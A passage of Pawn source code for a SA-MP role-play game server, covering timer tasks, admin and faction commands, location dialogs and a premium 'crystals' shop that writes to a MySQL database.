        if(s_PlayerInfo[i][pSPos][0] == s_PlayerInfo[i][pSPos][3] && s_PlayerInfo[i][pSPos][1] == s_PlayerInfo[i][pSPos][4] && s_PlayerInfo[i][pSPos][2] == s_PlayerInfo[i][pSPos][5])
            s_PlayerInfo[i][pSAFK] ++;

        else
            s_PlayerInfo[i][pSAFK] = 0;

        s_PlayerInfo[i][pSPos][3] = s_PlayerInfo[i][pSPos][0];
        s_PlayerInfo[i][pSPos][4] = s_PlayerInfo[i][pSPos][1];
        s_PlayerInfo[i][pSPos][5] = s_PlayerInfo[i][pSPos][2];
	}
	return 1;
}

task TowSecondsTimer[2000]()
{
	initiateServerQuestions();
	return 1;
}

task TenSecondsTimer[10000]()
{
	foreach(new i : WantedPlayers)
    {
		proceed_delay(i, "wanted_time");

        foreach(new copId : Cops)
        {
            if(!s_PlayerInfo[copId][pSOnDuty])
                continue;

            SetPlayerMarkerForPlayer(copId, i, (0xFF2B5D72 & 0xFFFFFF00));
        }
    }

    mysql_tquery(SQL, "select * from `emails` where `iReadStatus` = '0';", "CheckPlayersNewEmails");

	return 1;
}

task SyncUp[60000]()
{
    foreach(new vehicleid : VehicleType<VEH_TYPE_PERSONAL>)
    {
        new
            vehicleDBId = VehicleSQL[vehicleid];

        if(CarInfo[vehicleDBId][cSpawnTime] < gettime() && !IsVehicleOccupied(vehicleid))
        {
            DestroyPlayerVehicle(vehicleid, vehicleDBId);
            break;
        }
        else if(IsVehicleOccupied(vehicleid)) return CarInfo[vehicleDBId][cSpawnTime] = gettime() + MAX_VEHICLE_SPAWN_TIME;
    }

    foreach(new i : Player)
    {
        if(IsPlayerConnected(i))
        {

            if(PlayerInfo[i][pPremiumAccountDays] != 0)
                PlayerInfo[i][pPremiumAccountDays] --;
            else if(PlayerInfo[i][pPremiumAccountDays] == 0 && PlayerInfo[i][pPremiumAccount] != 0)
            {
                PlayerInfo[i][pPremiumAccount] = 0; 
                if(!Iter_Contains(Premiums, i) && !Iter_Contains(Admins, i)) Iter_Remove(Premiums, i);
            }

            if(PlayerInfo[i][pVIPAccountDays] != 0)
                PlayerInfo[i][pVIPAccountDays] --;
            else if(PlayerInfo[i][pVIPAccountDays] == 0 && PlayerInfo[i][pVIPAccount] != 0)
            {
                PlayerInfo[i][pVIPAccount] = 0;
                if(!Iter_Contains(Vips, i) && !Iter_Contains(Admins, i)) Iter_Remove(Vips, i);
            }
        }
    }
    return 1;
}

// ======== COMMANDS ========
YCMD:locations(playerid, params[], help)
{
    
    if(HavePlayerCheckpoint(playerid))
        showActiveCheckpointDialog(playerid);
    else
        Dialog_Show(playerid, DIALOG_LOCATIONS, DIALOG_STYLE_LIST, "SERVER: Server Locations", "Driving School(DMV)\nBusinesses\nFaction HQS\nVehicle Mod Shops\nPaintball\nDealership\nRent car", "Select", "Close");
    return 1; }
Dialog:DIALOG_LOCATIONS(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;
    
    switch(listitem) {
        case 0: SetPlayerCheckpoint(playerid, 1219.3429,-1812.7673,16.5938, 2.0), s_PlayerInfo[playerid][pSCP] = 1;          

        case 1: {

            gString[0] = EOS;
            gString = "ID\tName\tDistance\n";

            for(new i = 1; i < 55; i ++)
                format(gString, sizeof gString, "%s#%d\t%s\t%.2f km\n", gString, BizInfo[i][bID], business_name(BizInfo[i][bType]), GetPlayerDistanceFromPoint(playerid, BizInfo[i][bPosition][0], BizInfo[i][bPosition][1], BizInfo[i][bPosition][2]) / 1000);

            Dialog_Show(playerid, DIALOG_LOCATIONBUSINESS, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Businesses", gString, "Checkpoint", "Back");
            return 1;
        } 

        //case 2: Dialog_Show(playerid, DIALOG_HQS, DIALOG_STYLE_LIST, "SERVER: HQ Locations", "Los Santos Police Department\nNational Guard\nHitman Agency\nFBI\nNews Reporters\nGrove Street\nSF Bikers\nThe Italian Mafia\nParamedic Department\nThe Russian Mafia\nTaxi SF\nSan Fierro Police Department", "Checkpoint", "Back");
        //case 3: Dialog_Show(playerid, DIALOG_LOCATIONSMODS, DIALOG_STYLE_LIST, "SERVER: Vehicle Mod Shop Locations", "Tuning LS\nTuning LV\nLowrider Tuning", "Checkpoint", "Back");
        //case 4: AC_SetPlayerCheckpoint(playerid, -1989.8999, 1117.8953, 54.4688, 4.0), CP[playerid] = 43;
        //case 5: AC_SetPlayerCheckpoint(playerid, -1664.0269, 1207.5439, 7.2546, 4.0), CP[playerid] = 43;
        //case 6: AC_SetPlayerCheckpoint(playerid, -1982.1127, 304.1527, 35.1757, 4.0), CP[playerid] = 43;

    }
    return 1;
}
Dialog:DIALOG_LOCATIONBUSINESS(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new i = listitem + 1;

    SCM(playerid, COLOR_YELLOW, "A checkpoint was placed on your map."); 
    SetPlayerCheckpoint(playerid, BizInfo[i][bPosition][0], BizInfo[i][bPosition][1], BizInfo[i][bPosition][2], 5.0);
    s_PlayerInfo[playerid][pSCP] = 1;
    return 1;
}
YCMD:givegun(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 1)
        return sendAcces(playerid);

    new 
        targetID, weapID, weapString[30];

    if(sscanf(params, "ud", targetID, weapID)) 
        return sendSyntax(playerid, "/givegun [name/playerid] [gun id]");

    if(!IsPlayerConnected(targetID))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    if(weapID < 1 || weapID > 46 || weapID == 19 || weapID == 20 || weapID == 21 || weapID == 45) 
        return SCM(playerid, -1, "Invalid weapon ID.");

    if(PlayerInfo[targetID][pGunLic] == 0) 
        return SCM(playerid, -1, "This player doesn't have gun licence.");

    GivePlayerWeaponEx(targetID, weapID, 15000);
    GetWeaponName(weapID, weapString, sizeof weapString);

    ABroadCast(COLOR_RED2, 1, "ADMIN: {FFFFFF}%s has given weapon %s to %s.", GetName(playerid), weapString, GetName(targetID));

    if(GetPlayerState(targetID) == PLAYER_STATE_PASSENGER)
    {
        new 
            gun2, tmp;

        GetPlayerWeaponData(targetID, 5, gun2, tmp);

        if(gun2) 
            SetPlayerArmedWeapon(targetID,gun2);
        else 
            SetPlayerArmedWeapon(targetID, 0);
    }
    return 1;
}

CMD:granknames(playerid, params[])
{
    if (PlayerInfo[playerid][pRank] < 7)
        return 1;

    new
        rankId, rankName[32], rankDbName[16];
    
    if(sscanf(params, "ds[32]", rankId, rankName))
        return sendSyntax(playerid, "/granknames [rankid (1-7)] [rank title]");
    
    if(rankId < 1 || rankId > 7)
        return 1;

    mysql_real_escape_string(rankName, rankName);

    SCMF(playerid, -1, "You have changed the title of Rank %d to '%s'.", rankId, rankName);

    switch(rankId)
    {
        case 1: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sizeof rankName, rankName), rankDbName = "Rank1";
        case 3: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sizeof rankName, rankName), rankDbName = "Rank3";
        case 2: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sizeof rankName, rankName), rankDbName = "Rank2";
        case 4: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sizeof rankName, rankName), rankDbName = "Rank4";
        case 5: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sizeof rankName, rankName), rankDbName = "Rank5";
        case 6: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sizeof rankName, rankName), rankDbName = "Rank6";
        case 7: format(DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sizeof rankName, rankName), rankDbName = "Rank7";
    }
    mysql_format(SQL, gString, sizeof gString, "update `factions` set `%s` = '%s' where `id` = '%d'", rankDbName, rankName, PlayerInfo[playerid][pMember]);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

YCMD:email(playerid, params[], help)
{
    mysql_format(SQL, gString, sizeof gString, "select * from `emails` where `iPlayer` = '%d' order by `id` desc limit 10;", PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "CheckPlayerEmails", "i", playerid);
    return 1;
}
YCMD:acclear(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2)
    {
        foreach(new i : Player) {
                for(new j = 0; j <= 100; j++) SendClientMessage(i, COLOR_WHITE, "");
            }
        new sendername[25],string[100];
        GetPlayerName(playerid,sendername,sizeof(sendername));
        format(string,sizeof(string),"{909CE7}(/acclear){FFFFFF} %s cleared the admin chat.",sendername);
        ABroadCast(-1,1,string);
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1;
}
YCMD:cc(playerid, params[], help)
{
    foreach(new i : Player) {
        for(new j = 0; j <= 100; j++) SendClientMessage(i, COLOR_WHITE, "");
    }
    new sendername[25],string[100];
    GetPlayerName(playerid,sendername,sizeof(sendername));
    format(string,sizeof(string),"{909CE7}(/cc){FFFFFF} %s cleared the global chat.",sendername);
    ABroadCast(-1,1,string);
    return 1;
}
YCMD:changerank(playerid, params[], help)
{
    if(PlayerInfo[playerid][pRank] < 7)
        return SCM(playerid, -1, "You are not a leader.");

    new
        targetId, rankLevel;
    
    if(sscanf(params, "ui", targetId, rankLevel))
        return sendSyntax(playerid, "/changerank [name/playerid] [1-6]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, -1, "Player not connected.");
    
    if(rankLevel > 6 || rankLevel < 1)
        return SCM(playerid, -1, "Minimum rank is 1 and maximum is 6.");

    if(PlayerInfo[targetId][pMember] != PlayerInfo[playerid][pMember])
        return SCM(playerid, -1, "This member is not in your faction.");

    if(PlayerInfo[targetId][pRank] == 7)
        return SCM(playerid, -1, "This player is a leader.");

    SCMF(playerid, COLOR_LIGHTBLUE, "You have promoted %s to rank %d.", GetName(targetId), rankLevel);
    SCMF(targetId, COLOR_LIGHTBLUE, "%s has promoted you to rank %d.", GetName(playerid), rankLevel);
    
    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, "%s changed %s's faction rank to %d.", GetName(playerid), GetName(targetId), rankLevel);

    PlayerInfo[targetId][pMember] = PlayerInfo[playerid][pMember];

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Rank` = '%d' where `id` = '%d';", PlayerInfo[targetId][pRank], PlayerInfo[targetId][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    return 1;
}

YCMD:accept(playerid, params[], help)
{
    new
        itemName[64], targetId;

    if(sscanf(params, "s[64]u", itemName, targetId))
    {
        sendSyntax(playerid, "/accept [name] [name/playerid]");
        SCM(playerid, COLOR_WHITE, "Available names: Drugs, Repair, House, Materials, Dice.");
        SCM(playerid, COLOR_WHITE, "Available names: Taxi, Medic, Live, Mechanic, Ticket, Refill, Invite, Free.");
        return 1;
    }
    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_WHITE, "Player not connected.");

    if(strmatch(itemName, "invite"))
    {
        if(s_PlayerInfo[playerid][pSFactionOffer] == -1)
            return 1;

        new
            factionId = PlayerInfo[s_PlayerInfo[playerid][pSFactionOffer]][pMember];

        PlayerInfo[playerid][pMember] = factionId;
        PlayerInfo[playerid][pRank] = 1;

        Iter_Add(FactionMembers<factionId>, playerid);
        if(IsACop(playerid))
            Iter_Add(Cops, playerid);

        PlayerInfo[playerid][pFactionJoin] = gettime();
        PlayerInfo[playerid][pFactionTime] = gettime() + (7*86400);

        SCMF(playerid, COLOR_LIGHTBLUE, "You are now member of the %s.", NumeFactiune(factionId));
        SendFamilyMessage(factionId, COLOR_GENANNOUNCE, 0, "%s has joined the group (invited by %s).", GetName(playerid), GetName(s_PlayerInfo[playerid][pSFactionOffer]));

        mysql_format(SQL, gString, sizeof gString, "update `users` set `Member` = '%d', `Rank` = '1', `FactionJoin` = '%d', `FactionTime` = '%d' where `id` = '%d';", PlayerInfo[playerid][pMember], PlayerInfo[playerid][pFactionJoin], PlayerInfo[playerid][pFactionTime], PlayerInfo[playerid][pSQLID]);
        mysql_tquery(SQL, gString, "", "");

        mysql_format(SQL, gString, sizeof gString, "insert into `faction_logs` (`text`, `player`, `leader`) values ('%s has joined the group %s (invited by %s)', '%d', '%d');", PlayerInfo[playerid][pNormalName], NumeFactiune(PlayerInfo[playerid][pMember]), PlayerInfo[s_PlayerInfo[playerid][pSFactionOffer]][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[s_PlayerInfo[playerid][pSFactionOffer]][pSQLID]);
        mysql_tquery(SQL, gString, "", "");

        mysql_format(SQL, gString, sizeof gString, "insert into `factionlog` (`factionid`, `player`, `leader`, `action`) values ('%d', '%d', '%d', '%s [user:%d] has joined the group %s (invited by %s[user:%d]).');", PlayerInfo[playerid][pMember], PlayerInfo[playerid][pSQLID], PlayerInfo[s_PlayerInfo[playerid][pSFactionOffer]][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], NumeFactiune(factionId), GetName(s_PlayerInfo[playerid][pSFactionOffer]), PlayerInfo[s_PlayerInfo[playerid][pSFactionOffer]][pSQLID]);
        mysql_tquery(SQL, gString, "", "");

        // reset
        s_PlayerInfo[playerid][pSFactionOffer] = -1;

        return 1;

    }
    return 1;
}

YCMD:invite(playerid, params[], help)
{
    if(PlayerInfo[playerid][pRank] < 6) 
        return SendClientMessage(playerid, -1, "You need rank6+ to use this command.");

    new
        targetId;

    if(sscanf(params, "u", targetId))
        return sendSyntax(playerid, "/invite [name/playerid]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, -1, "Player not connected.");

    if(PlayerInfo[targetId][pMember])
        return SCM(playerid, -1, "This player is already in a group.");

    if(PlayerInfo[targetId][pFpunish] != 0)
        return SCM(playerid, -1, "You can not invite this player because he have faction punish.");

    mysql_format(SQL, gString, sizeof gString, "select * from `users` where `Member` = '%d' order by `id`;", PlayerInfo[playerid][pMember]);
    mysql_tquery(SQL, gString, "InviteFactionMember", "dd", playerid, targetId);
    return 1;
}

YCMD:stats(playerid, params[], help)
{
    return showPlayerStats(playerid, playerid);
}

YCMD:debugquests(playerid, params[], help)
{
    check_owner
    return GivePlayerQuests(playerid);
}

YCMD:quests(playerid, params[], help)
{
    return showQuestProgress(playerid);
}

YCMD:gotojob(playerid, params[], help)
{
    check_admin

    new
        jobString[256];

    for(new i = 1; i < SERVER_JOBS; ++i)
        format(jobString, sizeof jobString, "%s%s\n", jobString, job::returnJobName(i));

    Dialog_Show(playerid, DIALOG_GOTOJOB, DIALOG_STYLE_LIST, "Jobs:", jobString, "Select", "Close");
    return 1;
}

YCMD:flymode(playerid, params[], help)
{
    check_admin

	if(s_PlayerInfo[playerid][pSFlyMode] == 0)
	{
		s_PlayerInfo[playerid][pSFlyMode] = 1;

		InitFly(playerid);
		StartFly(playerid);
		SetPlayerHealthEx(playerid, 10000000);
	}
	else
	{
		SCM(playerid, COLOR_DARKPINK, "Fly mode off.");
		s_PlayerInfo[playerid][pSFlyMode] = 0;

		StopFly(playerid);
		SetPlayerHealthEx(playerid, 100);
	}
	return 1;
}

YCMD:fly(playerid, params[], help)
{
    check_admin

    new Float:posX, Float:posY, Float:posZ, Float:posA;

    if(IsPlayerInAnyVehicle(playerid))
        GetVehiclePos(GetPlayerVehicleID(playerid), posX, posY, posZ), GetVehicleZAngle(GetPlayerVehicleID(playerid), posA);

    else
        GetPlayerPos(playerid, posX, posY, posZ), GetPlayerFacingAngle(playerid, posA);

    posX += (7.5 * floatsin(-posA, degrees));
    posY += (7.5 * floatcos(-posA, degrees));

    if(IsPlayerInAnyVehicle(playerid))
        SetVehiclePos(GetPlayerVehicleID(playerid), posX, posY, posZ + 5);
    else
        SetPlayerPos(playerid, posX, posY, posZ + 5);

    return 1;
}

YCMD:spawncar(playerid, params[], help)
{
	check_admin

	new
		returnVehicleS, Float: targetIdPos[3], playerVehicle;
	
	if(sscanf(params, "i", returnVehicleS))
		return sendSyntax(playerid, "/spawncar [vehicleid]");

	if(returnVehicleS < 400 || returnVehicleS > 611)
		return SCM(playerid, -1, "Invalid vehicle.");

	GetPlayerPos(playerid, targetIdPos[0], targetIdPos[1], targetIdPos[2]);

	playerVehicle = AddStaticVehicleEx(returnVehicleS, targetIdPos[0], targetIdPos[1], targetIdPos[2], 90.0, 1, 1, -1, 300, VEH_TYPE_ADMIN);
	PutPlayerInVehicle(playerid, playerVehicle, 0);
	return 1;
}

YCMD:vre(playerid, params[], help)
{
	check_admin

	new
		vehicleId;
	
	if(IsPlayerInAnyVehicle(playerid))
		vehicleId = GetPlayerVehicleID(playerid);
	else
		if(sscanf(params, "i", vehicleId)) return sendSyntax(playerid, "/vre [vehicleid]");

	if(!IsValidVehicle(vehicleId))
        return SCM(playerid, -1, "Invalid vehicle id.");

    if(IsAJobVehicle(vehicleId))
        return SCM(playerid, COLOR_RED, "Nu poti despawna o masina de job.");

    if(Iter_Contains(VehicleType<VEH_TYPE_ADMIN>, vehicleId))
    	DestroyVehicle(vehicleId);

   	else
        SetVehicleToRespawn(vehicleId);

	return ABroadCast(COLOR_ADMCOMMANDS, 1, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) Admin %s respawned vehicle %d.", GetName(playerid), vehicleId);
}

YCMD:lights(playerid, params[], help)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
        return 1;

    new
    	engine, lights, alarm, doors, bonnet, boot, objective,
    	vehicleid = GetPlayerVehicleID(playerid);
	
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vehicleid, engine, VehicleInfo[vehicleid][vehLights] ? VEHICLE_PARAMS_OFF : VEHICLE_PARAMS_ON, alarm, doors, bonnet, boot, objective);
	
	return VehicleInfo[vehicleid][vehLights] = VehicleInfo[vehicleid][vehLights] ? (0) : (1);
}

YCMD:engine(playerid, params[], help)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		return 1;

	new
		vehicleid = GetPlayerVehicleID(playerid);

	if(IsABike(vehicleid))
		return 1;

	if(s_PlayerInfo[playerid][pSRefuelling])
		return SCM(playerid, -1, "You need to wait while you are reffueling your vehicle.");

	if(!VehicleInfo[vehicleid][vehFuel])
		return SCM(playerid, -1, "This vehicle doesn't have enough fuel.");

	new
		engine, lights, alarm, doors, bonnet, boot, objective;

	VehicleInfo[vehicleid][vehEngine] = VehicleInfo[vehicleid][vehEngine] ? (0) : (1);
	
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(vehicleid, (VehicleInfo[vehicleid][vehEngine] ? (VEHICLE_PARAMS_ON) : (VEHICLE_PARAMS_OFF)), lights, alarm, doors, bonnet, boot, objective);	

	sendNearbyMessage(playerid, COLOR_PURPLE, "* %s %s the engine of %s.", (s_PlayerInfo[playerid][pSUndercover] ? ("An unknown hitman") : GetName(playerid)), (VehicleInfo[vehicleid][vehEngine] ? ("starts") : ("stops")), GetVehicleName(vehicleid));
	return 1;
}

YCMD:sstats(playerid, params[], help)
{
	check_admin

	SCM(playerid, COLOR_TEAL, "------------------------------- System variables (current) -------------------------------");

	SCMF(playerid, -1, "Tick: %d | MYSQL Unprocessed Queries: %d | Objects: %d | Pickups: %d | 3D Text Labels: %d", GetServerTickRate(), mysql_unprocessed_queries(), CountDynamicObjects(), CountDynamicPickups(), CountDynamic3DTextLabels());
	SCMF(playerid, -1, "Vehicles: %d [%d personal, %d admin, %d server (group+free+clan), %d job]", Iter_Count(VehicleType<VEH_TYPE_PERSONAL>) + Iter_Count(VehicleType<VEH_TYPE_ADMIN>) + Iter_Count(VehicleType<VEH_TYPE_GROUP>) + Iter_Count(VehicleType<VEH_TYPE_NONE>) + Iter_Count(VehicleType<VEH_TYPE_CLAN> + Iter_Count(VehicleType<VEH_TYPE_JOB>)), Iter_Count(VehicleType<VEH_TYPE_PERSONAL>), Iter_Count(VehicleType<VEH_TYPE_ADMIN>), (Iter_Count(VehicleType<VEH_TYPE_GROUP>) + Iter_Count(VehicleType<VEH_TYPE_NONE>) + Iter_Count(VehicleType<VEH_TYPE_CLAN>)), Iter_Count(VehicleType<VEH_TYPE_JOB>));
	
	return SCM(playerid, COLOR_TEAL, "-----------------------------------------------------------------------------------");
}
YCMD:shop(playerid, params[], help) {
    gString[0] = (EOS);
    format(gString, sizeof gString, "Type\tExtra\n1. common shop\t{909CE7}you have %d crystals", PlayerInfo[playerid][pPremiumPoints]);
    //format(gString, sizeof gString, "Type\tExtra\n1. Regular shop\t{909CE7}you have %d crystals\n2. Special shop\t{909CE7}available\n3. Use voucher\t{909CE7}you have %d vouchers", PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pVoucher][1]);*/
    Dialog_Show(playerid, DIALOG_CHOOSESHOP, DIALOG_STYLE_TABLIST_HEADERS, "SHOP", gString, "Select", "Exit");
    return 1; }
Dialog:DIALOG_CHOOSESHOP(playerid, response, listitem, inputtext[])
{
    if(!response) return 1;
    switch(listitem) {
        case 0: {
            gString[0] = (EOS);
            format(gString, sizeof gString, "No\tItem\tprice\n");
            format(gString, sizeof gString, "%s{909CE7}(!)\t{FFFFFF}informatii shop\n", gString);
            format(gString, sizeof gString, "%s1.\taccount upgrades\t{909CE7}click for more options\n2.\tchange nickname\t{909CE7}100 crystals\n", gString);
            format(gString, sizeof gString, "%s3.\tdelete 20 faction punish\t{909CE7}50 crystals\n", gString);
            format(gString, sizeof gString, "%s4.\tdelete all warnings\t{909CE7}100 crystals\n", gString);
            format(gString, sizeof gString, "%s5.\t1 vehicle color hidden\t{909CE7}50 crystals\n", gString);
            format(gString, sizeof gString, "%s6.\t+1 vehicle slot\t{909CE7}75 crystals\n7.\tprivate frequency\t{909CE7}100 crystals\n8.\tspecial phone\t{909CE7}100 crystals\n9.\tdelete all faction history\t{909CE7}150 crystals\n10.\tcreate your clan\t{909CE7}300 crystals/3 months\n", gString);
            format(gString, sizeof gString, "%s11.\tget personal pet\t{909CE7}150 crystals\n12.\tmini mp3 player\t{909CE7}100 crystals\n13.\tcrystals voucher\t{909CE7}110 crystals", gString);
            Dialog_Show(playerid, DIALOG_SHOP, DIALOG_STYLE_TABLIST_HEADERS, "common shop", gString, "select", "cancel");
        }
        /*case 1: {
            gString[0] = EOS;
            format(gString, sizeof gString, "#\tItem\tprice\n");
            format(gString, sizeof gString, "%s1.\tEMS Upgrade Tickets\t{909CE7}multiple options\n2.\tNeons\t{909CE7}multiple options\n", gString);
            Dialog_Show(playerid, DIALOG_SPECIALSHOP, DIALOG_STYLE_TABLIST_HEADERS, "Special Shop", gString, "Buy", "Exit");
        }
        case 2: {
            if(PlayerInfo[playerid][pVoucher][1] <= 0) 
                return SCM(playerid, COLOR_WHITE, "You don't have any vouchers.");

            PlayerInfo[playerid][pVoucher][1] --; 
            PlayerInfo[playerid][pPremiumPoints] += 100; 
            save_vouchers(playerid); 
            pUpdateInt(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);
            
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai deschis un voucher si ai primit in schimb la 100 de cristale.");
        }*/
    }
    return 1;
}
Dialog:DIALOG_SHOP(playerid, response, listitem, inputtext[])
{
    new string[300];
    if(!response) return 1;
    switch(listitem) {
        case 0: {
            strcat(string, "Playerii ce vor sa ajute comunitatea pot cumpara crystals (cu bani reali).\n");
            strcat(string, "Se pot cumpara cristale folosind paysafecard sau paypal.\n");
            strcat(string, "1 euro = 100 cristale");
            Dialog_Show(playerid, DIALOG_0, DIALOG_STYLE_MSGBOX, "Info", string, "Close", "");
        }
        case 1: {
            if(!PlayerInfo[playerid][pPremiumAccount])
                Dialog_Show(playerid, DIALOG_ACCUPGRADE, DIALOG_STYLE_TABLIST_HEADERS, "Account upgrades", "#\tType\n1.\t{909CE7}Premium Account\n2.\t{909CE7}VIP Account", "Select", "Close");
            else 
            {
                gString[0] = EOS;
                format(gString, sizeof gString, "#\tType\n1.\t{909CE7}Premium Account\n2.\t{909CE7}VIP Account\n3.\t{FF6347}Upgrade to VIP Account (%d crystals for %d days)", returnConvertion(playerid), PlayerInfo[playerid][pPremiumAccountDays]);
                Dialog_Show(playerid, DIALOG_ACCUPGRADE6, DIALOG_STYLE_TABLIST_HEADERS, "Account upgrades", gString, "Select", "Close");
            }
        }
        case 2: {
            if(PlayerInfo[playerid][pPremiumPoints] < 100) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            Dialog_Show(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Change name:", "Please enter your desired name below:", "Ok", "Cancel");
        }
        case 3: {
            if(PlayerInfo[playerid][pPremiumPoints] < 50) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            if(PlayerInfo[playerid][pFpunish] <= 0) 
                return sendError(playerid, "You don't have faction punish.");

            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 50 crystals to clear his FP.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 50 cristale pentru a-ti sterge FP-urile.");

            PlayerInfo[playerid][pPremiumPoints] -= 50;
            PlayerInfo[playerid][pFpunish] = 0;
            
            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `FPunish` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pFpunish], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");
            
            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 50 crystals to clear his FP.')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");
        }
        case 4: {
            if(PlayerInfo[playerid][pPremiumPoints] < 100) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            if(PlayerInfo[playerid][pWarns] <= 0) 
                return sendError(playerid, "You don't have warns.");

            PlayerInfo[playerid][pPremiumPoints] -= 100;
            PlayerInfo[playerid][pWarns] = 0;

            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 100 crystals to clear his warns.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 100 cristale pentru a-ti sterge warn-urile.");

            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `Warnings` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pWarns], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            gString[0] = (EOS);
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 100 crystals to clear his warns.')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");         
        }
        case 5: {
            /*if(PlayerInfo[playerid][pPremiumPoints] < 50) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            PlayerInfo[playerid][pPremiumPoints] -= 50;
            PlayerInfo[playerid][pHiddenColor] += 1;
            
            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 50 crystals to buy a hidden color.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 50 cristale pentru a cumpara o culoare hidden.");

            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `HiddenColor` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pHiddenColor], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            gString[0] = (EOS);
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 50 crystals to buy a hidden color.')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");*/
        }
        case 6: {
            if(PlayerInfo[playerid][pPremiumPoints] < 75) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");

            if(PlayerInfo[playerid][pCarSlots] >= 19) 
                return sendError(playerid, "You can't buy more than 19 vehicle slots.");

            PlayerInfo[playerid][pPremiumPoints] -= 75;
            PlayerInfo[playerid][pCarSlots] += 1;

            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 75 crystals to buy a vehicle slot.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 75 cristale pentru a cumpara un slot pentru masini.");

            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `CarSlots` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pCarSlots], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            gString[0] = (EOS);
